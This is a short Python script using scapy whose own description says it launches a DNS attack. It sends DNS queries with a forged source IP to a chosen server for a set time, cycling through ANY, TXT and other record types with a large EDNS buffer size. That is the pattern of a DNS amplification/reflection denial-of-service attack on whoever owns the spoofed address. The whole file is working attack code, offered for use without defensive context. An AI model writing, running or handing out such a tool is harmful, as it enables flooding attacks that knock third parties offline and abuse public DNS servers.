import argparse
from scapy.all import *
import time

def sendQueries(dnsSource, dnsDestination, queryName, duration):
    """
    Send DNS queries to a DNS server
    :param dnsSource: Source IP
    :param dnsDestination: Destination IP
    :param queryName: Query name
    :param duration: Duration in seconds
    """
    queryTypes = ["ALL", "A", "AAAA", "CNAME", "MX", "NS", "SOA", "TXT"]

    packetNumber = 0
    endTime = time.time() + duration

    while time.time() < endTime:
        for queryType in queryTypes:
            packetNumber += 1
            dnsQuery = IP(src=dnsSource, dst=dnsDestination) / UDP(sport=RandShort(), dport=53) / DNS(id=packetNumber, rd=1, ad=0, cd=1, qd=DNSQR(qname=queryName, qtype=queryType), ar=DNSRROPT(rclass=8192))

            try:
                send(dnsQuery, verbose=0)
            except Exception as e:
                print(f"An exception occurred: {e}\n")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Launch DNS attack')
    parser.add_argument('-s', '--dnsSource', type=str, help='Source IP')
    parser.add_argument('-d', '--dnsDestination', type=str, help='Destination IP')
    parser.add_argument('-q', '--queryName', type=str, help='Query name')
    parser.add_argument('-t', '--duration', type=int, help='Duration in seconds')

    args = parser.parse_args()
    sendQueries(args.dnsSource, args.dnsDestination, args.queryName, args.duration)